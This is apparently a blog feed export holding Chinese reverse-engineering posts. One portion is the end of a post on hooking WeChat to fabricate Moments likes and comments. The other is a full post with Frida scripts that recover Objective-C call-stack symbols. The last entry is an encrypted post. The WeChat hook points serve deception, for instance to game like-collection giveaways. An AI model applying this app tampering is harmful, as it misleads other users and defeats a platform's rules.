Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92    frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992    frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240    frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776    frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248    frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932</code></pre><p>但是用我写的sbt命令就能恢复oc符号，下面我们对<code>-[WCDataItem setCid:]</code>下断点，然后得到调用栈</p><pre><code>(lldb) sbt==========================================xia0LLDB==========================================  BlockSymbolFile    Not Set The Block Symbol Json File, Try &#39;sbt -f&#39;============================================================================================  frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0  frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004  frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340  frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228  frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92  frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64  frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116  frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48  frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552  frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348  frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233  frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732  frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider MessageReturn:Event:] + 112  frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336  frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728  frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68  frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84  frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88  frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32  frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884  frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252  frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832  frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452  frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104  frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216  frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268  frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4</code></pre><p>可以看到调用栈的符号已经恢复了，能够清晰的看出调用的过程</p><p>其中里面有个很明显的方法</p><p><code>-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:]</code></p><p>看名字就知道，这个应该就是我们需要的hook点。</p><h5 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h5><p>整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。</p><p>大概的代码逻辑应该如下</p><ul><li>在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈</li><li>取出自己朋友圈的赞和评论数据备用</li><li>随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面</li></ul><p>下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。</p><p>这里分析的过程和上面类似，我选择的hook点为：<br><code>-[WCCommentDetailViewControllerFB setDataItem:]</code></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>具体的代码实现这里就不再去分析了，我把代码开源到了这里<a href="https://github.com/4ch12dy/fkwechatzan">fkwechatzan</a></p><h4 id="完成效果"><a href="#完成效果" class="headerlink" title="完成效果"></a>完成效果</h4><ul><li><p>集赞助手设置界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1361564255775_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li></ul><ul><li><p>朋友圈详情界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1341564229215_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li><li><p>赞和评论</p></li></ul><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1321564227655_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p><h4 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h4><p>本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。</p><p>最后，妈妈再也不用担心没有人赞我的朋友圈了~</p><p>下次集赞领礼品的活动我要定了！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;微信集赞-评论插件分析及开发&quot;&gt;&lt;a href=&quot;#微信集赞-评论插件分析及开发&quot; class=&quot;headerlink&quot; title=&quot;微信集赞/评论插件分析及开发&quot;&gt;&lt;/a&gt;微信集赞/评论插件分析及开发&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-07-02T13:04:25.994Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
      <category term="iosre" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iosre/"/>
    
  </entry>
  
  <entry>
    <title>android调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid调试深度总结/andoid调试深度总结/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-07-30T07:54:10.968Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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